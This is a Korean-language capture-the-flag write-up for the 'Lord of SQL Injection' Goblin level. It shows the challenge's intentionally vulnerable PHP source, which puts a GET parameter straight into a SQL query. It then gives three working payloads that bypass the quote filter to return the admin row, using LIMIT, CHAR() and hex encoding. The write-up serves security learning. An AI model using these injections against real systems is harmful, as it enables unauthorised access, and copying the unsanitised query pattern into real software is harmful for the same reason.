# Lord of SQL Injection No.3 - Goblin
## 문제 출제 의도
1. UNION 구문 없이 SQL Injection이 가능한지 확인.
2. '(single quote),"(quote),`(grave accent)없이 WHERE 구문의 조작이 가능한지 확인.
## 소스 코드
~~~
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
    if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
    $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("goblin");
    highlight_file(__FILE__); 
?>
~~~
## 분석 결론
+ 금지 문자, 문자열
    - GET방식으로 입력받은 no값에 prob _ . () 중 하나라도 있다면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.
    - GET방식으로 입력받은 no값에 '(single quote),"(quote),`(grave accent) 중 하나라도 있다면 "No Quotes ~_~ "이 출력되고 문제 풀이에 실패한다.
+ 풀이 성공 조건
     - 데이터베이스에서 받아온 id 값이 'admin'이면 문제 풀이에 성공한다.
## 문제 해결
1. limit 구문 이용
    - Select문에 LIMIT을 사용하여 select 결과를 제한 할 수 있다.
    - limit 구문은 다음과 같은 형식을 취한다.
    ~~~
    limit 시작인덱스, 개수
    ~~~
    - a번 인덱스 쿼리부터 b개 만큼 출력하겠다는 의미이다.
    - 갯수를 1로 고정하고, 시작인덱스를 1로 늘려가며 admin값을 찾을 수 있다.
    - 다음과 유사한 방법으로 admin을 찾을 수 있다.
    ~~~
    ?no=1 or 1 limit 1,1 -- -
    ~~~
2. ascii 코드이용
    - URL에 CHAR 함수를 통해 ASCII값으로 문자를 입력할수있다.
    - 문자를 문자열로 만들때는 사이에 ,를 넣어 연결한다.
    - 다음과 유사한 방법으로 id에 admin값을 입력할 수 있다.
    ~~~
    ?no=0 or id=char(97,100,109,105,110) -- -
    ~~~
    - no 값을 1을 준다면 앞 query의 id=guest도 WHERE 조건절 안에 포함이 되어 문제 풀이에 실패한다.
3. Hex코드 이용
    - 0x다음에16진수를 입력하여 ascii 코드를 입력 가능하다.
    - 다음과 유사한 방법으로 id에 admin값을 입력할 수 있다.
    ~~~
    ?no=0 or id=0x61646D696E -- -
    ~~~